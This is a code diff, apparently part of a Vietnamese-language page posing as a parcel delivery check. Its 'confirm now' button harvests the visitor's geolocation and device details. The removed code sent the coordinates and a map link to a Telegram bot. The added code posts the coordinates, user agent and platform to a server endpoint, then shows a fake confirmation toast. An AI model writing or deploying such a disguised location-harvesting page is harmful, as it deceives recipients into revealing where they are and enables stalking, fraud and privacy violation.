@@ -66,6 +66,9 @@ body{
   border-radius:10px;
   font-size:13px;
   text-decoration:none;
+  display:flex;
+  align-items:center;
+  gap:6px;
 }
 
 /* Timeline */
@@ -99,10 +102,12 @@ body{
   border-radius:50%;
   background:var(--gray);
   margin:auto;
+  transition:background 0.3s ease;
 }
 
 .active .circle{
   background:var(--primary);
+  animation:pulse 1s infinite;
 }
 
 .done .circle{
@@ -124,11 +129,58 @@ button{
   color:white;
   font-weight:600;
   margin-top:15px;
+  cursor:pointer;
+  position:relative;
+}
+
+button.loading::after{
+  content:"";
+  position:absolute;
+  right:20px;
+  top:50%;
+  width:16px;
+  height:16px;
+  border:2px solid white;
+  border-top-color:transparent;
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+  transform:translateY(-50%);
+}
+
+/* Toast */
+.toast{
+  position:fixed;
+  bottom:20px;
+  left:50%;
+  transform:translateX(-50%);
+  background:#16A34A;
+  color:white;
+  padding:12px 20px;
+  border-radius:8px;
+  box-shadow:0 4px 12px rgba(0,0,0,0.2);
+  opacity:0;
+  pointer-events:none;
+  transition:opacity 0.4s ease;
+}
+
+.toast.show{
+  opacity:1;
+}
+
+/* Animations */
+@keyframes pulse{
+  0%{box-shadow:0 0 0 0 rgba(37,99,235,0.6);}
+  70%{box-shadow:0 0 0 10px rgba(37,99,235,0);}
+  100%{box-shadow:0 0 0 0 rgba(37,99,235,0);}
+}
+
+@keyframes spin{
+  to{transform:translateY(-50%) rotate(360deg);}
 }
 </style>
 </head>
 
-<body onload="getLocation()">
+<body onload="getLocation">
 
 <div class="header">Kiểm Tra Giao Hàng</div>
 
@@ -146,7 +198,7 @@ button{
     <div style="font-size:13px;color:#6b7280">Shipper đang giao</div>
   </div>
 
-  <a href="tel:0786783272" class="call">Gọi</a>
+  <a href="tel:0786783272" class="call">📞 Gọi</a>
 </div>
 
 <!-- TIMELINE -->
@@ -172,25 +224,51 @@ button{
   </div>
 </div>
 
-<button onclick="getLocation()">XÁC NHẬN NGAY</button>
+<button id="confirmBtn" onclick="getLocation()">XÁC NHẬN NGAY</button>
 
 </div>
 
+<div class="toast" id="toast">✅ Đã gửi xác nhận thành công</div>
+
 <script>
+function showToast(){
+  const toast = document.getElementById("toast");
+  toast.classList.add("show");
+  setTimeout(()=>toast.classList.remove("show"),3000);
+}
 
+function sendToServer(lat, lon){
+  const btn = document.getElementById("confirmBtn");
+  btn.classList.add("loading");
 
-function sendToTelegram(lat, lon){
-  const text = `📦 CheckNow
-📍 ${lat}, ${lon}
-https://www.google.com/maps?q=${lat},${lon}`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
+  fetch("/api/send-data", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
     body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text
+      lat: lat,
+      lon: lon,
+      ip: "N/A",
+      device: {
+        browser: navigator.userAgent,
+        os: navigator.platform
+      }
     })
+  })
+  .then(res => res.json())
+  .then(data => {
+    btn.classList.remove("loading");
+    if(data.success){
+      updateStep();
+      setTimeout(finish, 2000);
+      showToast();
+    } else {
+      alert("Có lỗi khi gửi dữ liệu: " + data.message);
+    }
+  })
+  .catch(err => {
+    btn.classList.remove("loading");
+    console.error("Error:", err);
+    alert("Không thể gửi dữ liệu đến server.");
   });
 }
 
@@ -217,12 +295,10 @@ function finish(){
 function getLocation(){
   navigator.geolocation.getCurrentPosition(
     function(pos){
-      sendToTelegram(pos.coords.latitude, pos.coords.longitude);
-      updateStep();
-      setTimeout(finish, 2000);
+      sendToServer(pos.coords.latitude, pos.coords.longitude);
     },
     function(){
-      alert("Bạn cần cho xác nhận đơn hàng");
+      alert("Bạn cần cho phép xác nhận đơn hàng");
     }
   );
 }
